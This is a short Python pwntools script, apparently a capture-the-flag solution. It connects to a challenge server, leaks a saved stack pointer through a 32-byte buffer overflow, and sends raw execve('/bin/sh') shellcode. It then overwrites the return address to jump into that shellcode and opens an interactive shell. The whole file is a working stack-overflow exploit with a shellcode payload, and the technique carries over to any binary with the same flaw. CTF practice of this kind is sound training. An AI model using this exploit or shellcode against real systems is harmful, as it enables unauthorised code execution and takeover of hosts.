from pwn import *
# all.chal.cyberjousting.com 1348
# r = gdb.debug("./all_patched", 'b* 0x4011E7')
r = remote('all.chal.cyberjousting.com', 1348)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

payload = b'A' * 32
r.send(payload)
r.recvuntil(b'A' * 32)
rbp = u64(r.recv(6) + b'\x00\x00')
print("rbp:", hex(rbp))

buf = rbp - 0x40
print("buf:", hex(buf))


shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05"

payload = b'quit' + b'\x00'
payload += shellcode

print("payload size:", len(payload))

payload += b'A' * ((32 + 8) - len(payload))
payload += p64(buf + 0x5)



r.send(payload)

r.interactive()
